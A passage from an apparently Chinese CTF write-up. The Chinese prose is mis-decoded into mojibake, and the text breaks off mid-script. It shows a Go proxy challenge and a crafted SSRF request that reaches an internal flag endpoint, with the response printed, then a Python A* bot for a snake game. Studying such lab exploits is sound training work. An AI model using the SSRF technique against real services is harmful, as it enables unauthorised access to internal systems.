class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ProxyRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">URL             <span class="type">string</span>            <span class="string">`json:&quot;url&quot; binding:&quot;required&quot;`</span></span><br><span class="line">Method          <span class="type">string</span>            <span class="string">`json:&quot;method&quot; binding:&quot;required&quot;`</span></span><br><span class="line">Body            <span class="type">string</span>            <span class="string">`json:&quot;body&quot;`</span></span><br><span class="line">Headers         <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;headers&quot;`</span></span><br><span class="line">FollowRedirects <span class="type">bool</span>              <span class="string">`json:&quot;follow_redirects&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line"></span><br><span class="line">v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">flag, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v2 := r.Group(<span class="string">&quot;/v2&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v2.POST(<span class="string">&quot;/api/proxy&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> proxyRequest ProxyRequest</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client := &amp;http.Client&#123;</span><br><span class="line">CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !req.URL.IsAbs() &#123;</span><br><span class="line"><span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !proxyRequest.FollowRedirects &#123;</span><br><span class="line"><span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class="type">byte</span>(proxyRequest.Body)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> proxyRequest.Headers &#123;</span><br><span class="line">req.Header.Set(key, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">body, err := io.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.Status(resp.StatusCode)</span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> resp.Header &#123;</span><br><span class="line">c.Header(key, value[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.Writer.Write(body)</span><br><span class="line">c.Abort()</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">&quot;127.0.0.1:8769&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å…ˆçœ‹çœ‹ /v1/api/flagï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">flag, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¯»å– flag æ–‡ä»¶ï¼Œ ç„¶åè¿”å›è¾“å‡ºã€‚</p><p>â€‹ <code>/v2/api/proxy</code>  å­˜åœ¨ ssrfã€‚ç›´æ¥è®¿é—® flag æ— æ³•è®¿é—®ï¼Œå› æ­¤éœ€è¦ ssrfã€‚</p><p>â€‹æ­£å¥½ï¼Œç»™äº†é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server <span class="punctuation">&#123;</span></span><br><span class="line">    listen <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">    location ~ /v1 <span class="punctuation">&#123;</span></span><br><span class="line">        return <span class="number">403</span>;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    location ~ /v2 <span class="punctuation">&#123;</span></span><br><span class="line">        proxy_pass http<span class="punctuation">:</span><span class="comment">//localhost:8769;</span></span><br><span class="line">        proxy_http_version <span class="number">1.1</span>;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $connection_upgrade;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹æ ¹æ® <code>proxy_set_header X-Real-IP $remote_addr;</code> , å¯ä»¥ç¡®å®šèƒ½æ‰“ ssrfã€‚</p><p>â€‹/v2/api/proxy æ˜¯ä»¥ json å½¢å¼å‘åŒ…çš„ï¼Œå¯ä»¥æï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/v2/api/proxy</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.107.225.62:30903</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>142</span><br><span class="line"></span><br><span class="line"><span class="language-css">&#123;&quot;url&quot;:<span class="string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span>,<span class="string">&quot;method&quot;</span>:<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;headers&quot;</span>:&#123;&quot;<span class="attribute">Content</span>-Type&quot;:<span class="string">&quot;application/json&quot;</span>&#125;,&quot;<span class="selector-tag">body</span>&quot;:<span class="string">&quot;&quot;</span>,<span class="string">&quot;follow_redirects&quot;</span>:false</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹å“åº”ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.27.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 03 Nov 2024 07:11:08 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>67</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="string">&quot;ZmxhZ3tkM2MxNzZjZC05ZjhiLTRlOWQtOWM3Yi1mYzgyZTUxYzUwOTd9&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><h2 id="snake"><a class="markdownIt-Anchor" href="#snake">#</a> snakeï¼š</h2><p>â€‹æ‰“æ¸¸æˆï¼Œå†™ä¸ªè„šæœ¬å»è·‘ï¼Œå…ˆå®¡ jsï¼Œå‘ç°äº†ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚ move è·¯ç”±ä»€ä¹ˆçš„ï¼Œç›´æ¥æ‹¿å»å†™è„šæœ¬ï¼Œç½‘ä¸Šæ‰¾äº†ä¸€åœˆï¼Œæ‰¾åˆ°ä¸€äº›ç®—æ³•ï¼Œ éƒ½æ”¹ä¸€æ”¹æ‹¿å»è¯•ï¼Œæœ€åè¿™ä¸ªèƒ½è·‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹æ–¹å‘</span></span><br><span class="line">current_direction = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze4zqdxex49cesyexgc.cloudeci1.ichunqiu.com:5000/move&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€æ–¹å‘è¯·æ±‚å¹¶è·å–æ¸¸æˆçŠ¶æ€</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_direction_and_get_state</span>(<span class="params">direction</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJ1c2VybmFtZSI6ImcwMWRlbiJ9.ZycoKQ.BlD0y752_1q7iLu3ZVk5tsO6fKo&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = json.dumps(&#123;<span class="string">&quot;direction&quot;</span>: direction&#125;)</span><br><span class="line">    response = requests.post(url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&quot;Failed to send direction: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response:&quot;</span>, response.json())</span><br><span class="line">    <span class="keyword">return</span> response.json()</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—æ›¼å“ˆé¡¿è·ç¦»</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heuristic</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(a[<span class="number">0</span>] - b[<span class="number">0</span>]) + <span class="built_in">abs</span>(a[<span class="number">1</span>] - b[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># A* å¯»è·¯ç®—æ³•</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a_star_search</span>(<span class="params">start, goal, snake</span>):</span><br><span class="line">    open_set = []</span><br><span class="line">    heapq.heappush(open_set, (<span class="number">0</span>, start))</span><br><span class="line">    came_from = &#123;&#125;</span><br><span class="line">    g_score = &#123;<span class="built_in">tuple</span>(start): <span class="number">0</span>&#125;</span><br><span class="line">    f_score = &#123;<span class="built_in">tuple</span>(start): heuristic(start, goal)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> open_set:</span><br><span class="line">        _, current = heapq.heappop(open_set)</span><br><span class="line">        current = <span class="built_in">tuple</span>(current)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current == <span class="built_in">tuple</span>(goal):</span><br><span class="line">            path = []</span><br><span class="line">            <span class="keyword">while</span> current <span class="keyword">in</span> came_from:</span><br><span class="line">                path.append(current)</span><br><span class="line">                current = came_from[current]</span><br><span class="line">            path.reverse()</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">        neighbors = [</span><br><span class="line">            (current[<span class="number">0</span>] + <span class="number">1</span>, current[<span class="number">1</span>]),  <span class="comment"># RIGHT</span></span><br><span class="line">            (current[<span class="number">0</span>] - <span class="number">1</span>, current[<span class="number">1</span>]),  <span class="comment"># LEFT</span></span><br><span class="line">            (current[<span class="number">0</span>], current[<span class="number">1</span>] + <span class="number">1</span>),  <span class="comment"># DOWN</span></span><br><span class="line">            (current[<span class="number">0</span>], current[<span class="number">1</span>] - <span class="number">1</span>)   <span class="comment"># UP</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> neighbors:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= neighbor[<span class="number">0</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= neighbor[<span class="number">1</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="built_in">list</span>(neighbor) <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">                tentative_g_score = g_score[<span class="built_in">tuple</span>(current)] + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">tuple</span>(neighbor) <span class="keyword">not</span> <span class="keyword">in</span> g_score <span class="keyword">or</span> tentative_g_score &lt; g_score[<span class="built_in">tuple</span>(neighbor)]:</span><br><span class="line">                    came_from[<span class="built_in">tuple</span>(neighbor)] = current</span><br><span class="line">                    g_score[<span class="built_in">tuple</span>(neighbor)] = tentative_g_score</span><br><span class="line">                    f_score[<span class="built_in">tuple</span>(neighbor)] = tentative_g_score + heuristic(neighbor, goal)</span><br><span class="line">                    heapq.heappush(open_set, (f_score[<span class="built_in">tuple</span>(neighbor)], neighbor))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—ä¸‹ä¸€æ­¥çš„æ–¹å‘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_next_direction</span>(<span class="params">snake, food, current_direction</span>):</span><br><span class="line">    head = snake[<span class="number">0</span>]</span><br><span class="line">    path = a_star_search(head, food, snake)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> path:</span><br><span class="line">        next_head = path[<span class="number">0</span>]</span><br><span class="line">        x_diff = next_head[<span class="number">0</span>] - head[<span class="number">0</span>]</span><br><span class="line">        y_diff = next_head[<span class="number">1</span>] - head[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x_diff == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> x_diff == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;LEFT&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> y_diff == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;DOWN&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> y_diff == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;UP&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¦‚æœæ‰¾ä¸åˆ°è·¯å¾„ï¼Œéšæœºé€‰æ‹©ä¸€ä¸ªå®‰å…¨çš„æ–¹å‘</span></span><br><span class="line">    possible_directions = [<span class="string">&#x27;UP&#x27;</span>, <span class="string">&#x27;DOWN&#x27;</span>, <span class="string">&#x27;LEFT&#x27;</span>, <span class="string">&#x27;RIGHT&#x27;</span>]</span><br><span class="line">    opposite_directions = &#123;<span class="string">&#x27;UP&#x27;</span>: <span class="string">&#x27;DOWN&#x27;</span>, <span class="string">&#x27;DOWN&#x27;</span>: <span class="string">&#x27;UP&#x27;</span>, <span class="string">&#x27;LEFT&#x27;</span>: <span class="string">&#x27;RIGHT&#x27;</span>, <span class="string">&#x27;RIGHT&#x27;</span>: <span class="string">&#x27;LEFT&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> direction <span class="keyword">in</span> possible_directions:</span><br><span class="line">        <span class="keyword">if</span> direction == opposite_directions[current_direction]:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># ä¸é€‰æ‹©ç›¸åæ–¹å‘</span></span><br><span class="line"></span><br><span class="line">        next_head = &#123;</span><br><span class="line">            <span class="string">&#x27;UP&#x27;</span>: [head[<span class="number">0</span>], head[<span class="number">1</span>] - <span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;DOWN&#x27;</span>: [head[<span class="number">0</span>], head[<span class="number">1</span>] + <span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;LEFT&#x27;</span>: [head[<span class="number">0</span>] - <span class="number">1</span>, head[<span class="number">1</span>]],</span><br><span class="line">            <span class="string">&#x27;RIGHT&#x27;</span>: [head[<span class="number">0</span>] + <span class="number">1</span>, head[<span class="number">1</span>]]</span><br><span class="line">        &#125;[direction]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= next_head[<span class="number">0</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= next_head[<span class="number">1</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> next_head <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">            <span class="keyword">return</span> direction</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¦‚æœæ‰€æœ‰æ–¹å‘éƒ½ä¼šå¯¼è‡´ç¢°æ’ï¼Œè¿”å›å½“å‰æ–¹å‘</span></span><br><span class="line">    <span class="keyword">return</span> current_direction</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»å¾ªç¯</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_loop</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># åˆå§‹åŒ–æ¸¸æˆçŠ¶æ€</span></span><br><span class="line">        game_state = send_direction_and_get_state(<span class="string">&#x27;RIGHT&#x27;</span>)</span><br><span class="line">        snake = game_state[<span class="string">&#x27;snake&#x27;</span>]</span><br><span class="line">        food = game_state[<span class="string">&#x27;food&#x27;</span>]</span><br><span class="line">        score = game_state[<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">        current_direction = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># è®¡ç®—ä¸‹ä¸€æ­¥çš„æ–¹å‘</span></span><br><span class="line">            next_direction = calculate_next_direction(snake, food, current_direction)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># å‘é€æ–¹å‘è¯·æ±‚å¹¶è·å–æ–°çš„æ¸¸æˆçŠ¶æ€</span></span><br><span class="line">            game_state = send_direction_and_get_state(next_direction)</span><br><span class="line">            snake = game_state[<span class="string">&#x27;snake&#x27;</span>]</span><br><span class="line">            food = game_state[<span class="string">&#x27;food&#x27;</span>]</span><br><span class="line">            new_score = game_state[<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">            status = game_state[<span class="string">&#x27;status&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ›´æ–°æ–¹å‘</span></span><br><span class="line">            current_direction = next_direction</span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ‰“å°å½“å‰çŠ¶æ€</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Current 